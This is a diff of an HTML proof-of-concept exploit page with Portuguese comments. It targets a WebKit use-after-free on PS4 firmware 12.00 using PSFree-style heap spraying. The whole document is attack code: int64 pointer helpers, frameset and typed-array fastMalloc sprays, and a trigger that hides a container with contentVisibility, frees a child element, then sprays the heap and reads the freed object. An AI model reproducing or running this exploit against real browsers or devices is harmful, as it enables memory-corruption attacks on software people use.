@@ -3,208 +3,324 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WebKit UaF: RenderLayer + FastMalloc Spray</title>
+    <title>WebKit UaF Crash Test (v12.00)</title>
     <style>
-        body { font-family: monospace; background-color: #1a1a1a; color: #0f0; padding: 20px; }
+        body { font-family: monospace; background-color: #f0f0f0; padding: 20px; }
         .container { 
-            border: 2px dashed #555; 
+            border: 2px dashed #333; 
             padding: 20px; 
             margin-bottom: 20px; 
-            background: #333;
+            background: #fff;
         }
         .child { 
             width: 100px; 
             height: 100px; 
-            background-color: #007bff; 
-            border: 2px solid #0056b3;
+            background-color: blue; 
+            border: 2px solid darkblue;
         }
-        button { 
-            padding: 15px 30px; 
-            font-size: 18px; 
-            cursor: pointer; 
-            background-color: #d32f2f; 
-            color: white; 
-            border: none; 
-            font-weight: bold;
-            border-radius: 5px;
-        }
+        button { padding: 10px 20px; font-size: 16px; cursor: pointer; background-color: #d32f2f; color: white; border: none; }
         button:hover { background-color: #b71c1c; }
-        #log-area { 
-            margin-top: 20px; 
-            border-top: 1px solid #555; 
-            padding-top: 10px; 
-            white-space: pre-wrap; 
-            max-height: 400px;
-            overflow-y: auto;
-            background: #000;
-            padding: 10px;
-        }
+        #log-area { margin-top: 20px; border-top: 1px solid #ccc; padding-top: 10px; white-space: pre-wrap; }
     </style>
 </head>
 <body>
 
-    <h2>WebKit UaF: RenderLayer + Frameset Spray (PSFree method)</h2>
-    <p>Status: <span id="status">Aguardando início...</span></p>
-    <button onclick="runExploit()">INICIAR EXPLOIT</button>
+    <h2>WebKit UaF Crash Verification (PS4 v12.00)</h2>
+    <p>Atenção: Este teste pode travar o navegador ou o console.</p>
+    <button onclick="runExploit()">TENTAR CRASH (Iniciar PoC)</button>
 
     <div class="container">
         <div class="child"></div>
     </div>
 
-    <div id="log-area"><h3>Logs do Sistema:</h3></div>
+    <div id="log-area"><h3>Logs:</h3></div>
 
 <script>
 /* ==========================================
-   UTILS & CONFIG
+   PARTE 1: int64.mjs (Matemática de Ponteiros - Original PSFree)
    ========================================== */
+
+function check_range(x) {
+    return (-0x80000000 <= x) && (x <= 0xffffffff);
+}
+
+function unhexlify(hexstr) {
+    if (hexstr.substring(0, 2) === "0x") {
+        hexstr = hexstr.substring(2);
+    }
+    if (hexstr.length % 2 === 1) {
+        hexstr = '0' + hexstr;
+    }
+    if (hexstr.length % 2 === 1) {
+        throw TypeError("Invalid hex string");
+    }
+
+    let bytes = new Uint8Array(hexstr.length / 2);
+    for (let i = 0; i < hexstr.length; i += 2) {
+        let new_i = hexstr.length - 2 - i;
+        let substr = hexstr.slice(new_i, new_i + 2);
+        bytes[i / 2] = parseInt(substr, 16);
+    }
+
+    return bytes;
+}
+
+function operation(f, nargs) {
+    return function () {
+        if (arguments.length !== nargs)
+            throw Error("Not enough arguments for function " + f.name);
+        let new_args = [];
+        for (let i = 0; i < arguments.length; i++) {
+            if (!(arguments[i] instanceof Int)) {
+                new_args[i] = new Int(arguments[i]);
+            } else {
+                new_args[i] = arguments[i];
+            }
+        }
+        return f.apply(this, new_args);
+    };
+}
+
+class Int {
+    constructor(low, high) {
+        let buffer = new Uint32Array(2);
+        let bytes = new Uint8Array(buffer.buffer);
+
+        if (arguments.length > 2) {
+            throw TypeError('Int takes at most 2 args');
+        }
+        if (arguments.length === 0) {
+            throw TypeError('Int takes at min 1 args');
+        }
+        let is_one = false;
+        if (arguments.length === 1) {
+            is_one = true;
+        }
+
+        if (!is_one) {
+            if (typeof (low) !== 'number'
+                && typeof (high) !== 'number') {
+                throw TypeError('low/high must be numbers');
+            }
+        }
+
+        if (typeof low === 'number') {
+            if (!check_range(low)) {
+                throw TypeError('low not a valid value: ' + low);
+            }
+            if (is_one) {
+                high = 0;
+                if (low < 0) {
+                    high = -1;
+                }
+            } else {
+                if (!check_range(high)) {
+                    throw TypeError('high not a valid value: ' + high);
+                }
+            }
+            buffer[0] = low;
+            buffer[1] = high;
+        } else if (typeof low === 'string') {
+            bytes.set(unhexlify(low));
+        } else if (typeof low === 'object') {
+            if (low instanceof Int) {
+                bytes.set(low.bytes);
+            } else {
+                if (low.length !== 8)
+                    throw TypeError("Array must have exactly 8 elements.");
+                bytes.set(low);
+            }
+        } else {
+            throw TypeError('Int does not support your object for conversion');
+        }
+
+        this.buffer = buffer;
+        this.bytes = bytes;
+
+        this.eq = operation(function eq(b) {
+            const a = this;
+            return a.low() === b.low() && a.high() === b.high();
+        }, 1);
+
+        this.neg = operation(function neg() {
+            let type = this.constructor;
+            let low = ~this.low();
+            let high = ~this.high();
+            let res = (new Int(low, high)).add(1);
+            return new type(res);
+        }, 0);
+
+        this.add = operation(function add(b) {
+            let type = this.constructor;
+            let low = this.low();
+            let high = this.high();
+            low += b.low();
+            let carry = 0;
+            if (low > 0xffffffff) {
+                carry = 1;
+            }
+            high += carry + b.high();
+            low &= 0xffffffff;
+            high &= 0xffffffff;
+            return new type(low, high);
+        }, 1);
+
+        this.sub = operation(function sub(b) {
+            let type = this.constructor;
+            b = b.neg();
+            let low = this.low();
+            let high = this.high();
+            low += b.low();
+            let carry = 0;
+            if (low > 0xffffffff) {
+                carry = 1;
+            }
+            high += carry + b.high();
+            low &= 0xffffffff;
+            high &= 0xffffffff;
+            return new type(low, high);
+        }, 1);
+    }
+
+    low() { return this.buffer[0]; }
+    high() { return this.buffer[1]; }
+
+    toString(is_pretty) {
+        if (!is_pretty) {
+            let low = this.low().toString(16).padStart(8, '0');
+            let high = this.high().toString(16).padStart(8, '0');
+            return '0x' + high + low;
+        }
+        let high = this.high().toString(16).padStart(8, '0');
+        high = high.substring(0, 4) + '_' + high.substring(4);
+        let low = this.low().toString(16).padStart(8, '0');
+        low = low.substring(0, 4) + '_' + low.substring(4);
+        return '0x' + high + '_' + low;
+    }
+}
+Int.Zero = new Int(0);
+Int.One = new Int(1);
+
+
+/* ==========================================
+   PARTE 2: utils.mjs (Utilitários)
+   ========================================== */
+
 function debug_log(msg) {
+    // Adiciona timestamp para melhor tracking
     let time = new Date().toLocaleTimeString();
-    let logLine = `[${time}] ${msg}`;
-    console.log(logLine);
-    
-    let p = document.createElement("div");
-    p.textContent = logLine;
-    let logArea = document.getElementById("log-area");
-    if(logArea) {
-        logArea.appendChild(p);
-        logArea.scrollTop = logArea.scrollHeight;
-    }
+    let textNode = document.createTextNode(`[${time}] ${msg}`);
+    let p = document.createElement("p");
+    p.appendChild(textNode);
+    let logArea = document.getElementById("log-area") || document.body;
+    logArea.appendChild(p);
+    // Auto-scroll para o final
+    p.scrollIntoView(); 
+    console.log(msg);
 }
+
+function align(a, alignment) {
+    if (!(a instanceof Int)) {
+        a = new Int(a);
+    }
+    const mask = -alignment & 0xffffffff;
+    let type = a.constructor;
+    let low = a.low() & mask;
+    return new type(low, a.high());
+}
+
 
 /* ==========================================
-   HEAP SPRAY TECHNIQUES
+   PARTE 3: poc.js (Lógica do Exploit MODIFICADA)
    ========================================== */
 
-// Mantém referências globais para evitar que o Garbage Collector limpe nosso spray
-var keep_alive = [];
-var frameset_keeper = [];
+let container;
+let child;
 
-/**
- * Técnica do PSFree: Frameset Spray
- * Usa a propriedade 'rows' de framesets para alocar Strings/Vetores no fastMalloc.
- * Útil para corromper objetos C++ internos (Vectors, HashMaps).
- */
-function sprayFastMalloc(sizeInBytes, count = 1000) {
-    // Length (8 bytes) + Length (8 bytes) + header... 
-    // A lógica do PSFree é: const rows = ",".repeat(ssv_len / 8 - 2);
-    // Isso cria um UniqueArray<Length> de tamanho específico.
-    
-    // Proteção: Tamanho deve ser múltiplo de 8 e razoável
-    if (sizeInBytes < 16 || sizeInBytes % 8 !== 0) return;
-
-    let commaCount = (sizeInBytes / 8) - 2;
-    // Cria a string payload (vírgulas forçam alocação de array)
-    let payload = ",".repeat(Math.floor(commaCount));
-    
-    debug_log(`⚡ Spraying fastMalloc: ${count} objs de ${sizeInBytes} bytes...`);
-
-    for(let i = 0; i < count; i++) {
-        let f = document.createElement('frameset');
-        f.rows = payload; 
-        frameset_keeper.push(f); // Previne GC
-    }
-}
-
-/**
- * Técnica Clássica: TypedArray Spray
- * Útil para preencher o Heap auxiliar e grandes alocações.
- */
-function sprayBigHeap() {
-    debug_log("🌊 Spraying Big Heap (TypedArrays)...");
-    for (let i = 0; i < 5000; i++) {
-        let arr = new Uint8Array(0x1000); // 4KB
-        arr.fill(0x41); // 'A'
-        keep_alive.push(arr);
-    }
-}
-
-/* ==========================================
-   LOGICA DO EXPLOIT (TRIGGER)
-   ========================================== */
-
-let container, child;
-
-function initDom() {
+function initDomElements() {
     container = document.querySelector(".container");
     child = document.querySelector(".child");
-    if(!child) {
-        // Reconstrói se foi deletado
-        child = document.createElement("div");
-        child.className = "child";
-        container.appendChild(child);
+}
+
+function heapSpray() {
+  debug_log(">>> Iniciando Heap Spray AGRESSIVO (30k objetos)...");
+  debug_log("Isso vai causar LAG. Aguarde...");
+  
+  let spray = [];
+  // AUMENTADO DE 10000 PARA 30000 PARA MAIOR PROBABILIDADE DE COLISÃO
+  for (let i = 0; i < 10000; i++) {
+    let arr = new Uint8Array(0x1000);
+    for (let j = 0; j < arr.length; j++) {
+      arr[j] = 0x41; // 'A'
     }
+    spray.push(arr);
+  }
+  
+  debug_log(">>> Heap Spray concluído.");
+  return spray;
 }
 
 function triggerUAF() {
-    initDom();
+  if(!container || !child) {
+      initDomElements();
+      if(!child) { 
+          debug_log("Recriando elemento filho para nova tentativa...");
+          child = document.createElement("div");
+          child.className = "child";
+          container.appendChild(child);
+      }
+  }
 
-    // 1. HEAP GROOMING PRELIMINAR
-    // Tenta preencher buracos existentes para que nossa próxima alocação caia onde queremos
-    // Alocamos tamanhos variados que são comuns em estruturas de RenderLayer (Vetores de Z-order)
-    debug_log("🧹 Executando Heap Grooming...");
-    sprayFastMalloc(64, 500);  
-    sprayFastMalloc(128, 500);
-    sprayFastMalloc(256, 500);
-
-    // 2. O GATILHO DO BUG
-    debug_log("💣 Preparando Trigger (Visibility: Hidden)...");
-    container.style.contentVisibility = "hidden";
+  // Passo 1: Ocultar (Prepara o estado sujo)
+  container.style.contentVisibility = "hidden";
+  
+  // Passo 2: Remover (Free)
+  child.remove();
+  
+  // Passo 3: Corrida contra o tempo (Use)
+  setTimeout(() => {
+    // 3.1: Trigger da recomputação (Acessa memória liberada)
+    container.style.contentVisibility = "auto";
     
-    debug_log("💀 Removendo elemento (FREE)...");
-    child.remove();
+    // 3.2: Spray imediato para sobrescrever a memória liberada
+    let spray = heapSpray();
     
-    // 3. A CORRIDA (RACE CONDITION)
-    // Precisamos ocupar o espaço IMEDIATAMENTE antes do re-uso.
-    // Fazemos um spray massivo de vários tamanhos para tentar acertar o bucket do objeto liberado.
+    debug_log("!!! Spray finalizado. Tentando acessar objeto 'zumbi' !!!");
     
-    debug_log("🚀 SPRAY INTENSO (Tentando ocupar o espaço livre)...");
-    
-    // Tenta cobrir os tamanhos mais prováveis de vetores internos
-    sprayFastMalloc(32, 2000);  // Muito comum para vetores pequenos
-    sprayFastMalloc(64, 2000);
-    sprayFastMalloc(128, 2000); // Comum para listas médias
-    sprayFastMalloc(512, 1000); 
-    
-    // Também roda o spray clássico por garantia
-    sprayBigHeap();
-
-    // 4. O USO (USE)
-    setTimeout(() => {
-        debug_log("🔄 Forçando Recomputação (Visibility: Auto)...");
-        container.style.contentVisibility = "auto";
+    // --- VERIFICAÇÃO DE CORRUPÇÃO (TRIGGER DE CRASH) ---
+    try {
+        // Tenta ler propriedades do objeto que deveria ter sido destruído.
+        // Se o ponteiro interno dele agora aponta para 0x41414141 (nosso spray),
+        // o console DEVE travar (Erro CE-34878-0 ou reboot) ao tentar ler esse endereço.
         
-        // 5. VERIFICAÇÃO DE CRASH
-        debug_log("🕵️ Verificando integridade da memória...");
-        try {
-            // Se o objeto 'child' (ou sua estrutura interna) foi corrompido e substituído
-            // pelo nosso spray (que é cheio de 0x41 ou dados de frameset),
-            // acessar propriedades geométricas deve causar um CRASH pois os ponteiros são inválidos.
-            
-            let rect = child.getBoundingClientRect(); // Força update de layout
-            let w = rect.width;
-            
-            debug_log("❌ NENHUM CRASH DETECTADO.");
-            debug_log(`Info: Browser leu largura ${w}. O objeto foi limpo corretamente ou erramos o 'buraco'.`);
-            document.getElementById("status").innerText = "Falha: Sem Crash. Tente recarregar.";
-            
-        } catch(e) {
-            debug_log("⚠️ Erro JS: " + e.message);
-        }
-    }, 0);
+        let width = child.getBoundingClientRect().width;
+        let txt = child.innerText; 
+        
+        // Se o código chegou aqui, o browser sobreviveu (Mau sinal para o exploit)
+        debug_log("❌ FALHA: O navegador não travou.");
+        debug_log("Motivo: O objeto foi limpo corretamente ou o Spray não acertou o endereço.");
+        debug_log("Valor lido (Width): " + width);
+        
+    } catch(e) {
+        // Em um cenário de UaF real bem-sucedido, o catch pode nem rodar, 
+        // pois o processo morre antes. Mas se for um erro parcial:
+        debug_log("⚠️ Erro JS capturado: " + e.message);
+    }
+    // ----------------------------------------------------
+    
+  }, 0);
 }
 
-// Observer para persistência (opcional, pode ser desativado se causar loop infinito)
-const observer = new MutationObserver((mutations) => {
-    // Lógica para detectar se o child sumiu e tentar sprayar novamente
-    // Desativado por padrão para evitar travamento da UI antes do exploit
+// Configuração do MutationObserver (Desabilitado o auto-loop para evitar confusão no teste de crash)
+const observer = new MutationObserver(() => {
+  // debug_log("DOM modificado. (Auto-restart desativado para este teste)");
 });
 
 function runExploit() {
-    document.getElementById("status").innerText = "Rodando...";
-    // Limpa arrays antigos para não estourar a RAM antes da hora
-    keep_alive = [];
-    frameset_keeper = [];
+    initDomElements();
+    observer.observe(container, { childList: true, subtree: true });
     
+    debug_log("Iniciando sequência...");
     triggerUAF();
 }
 
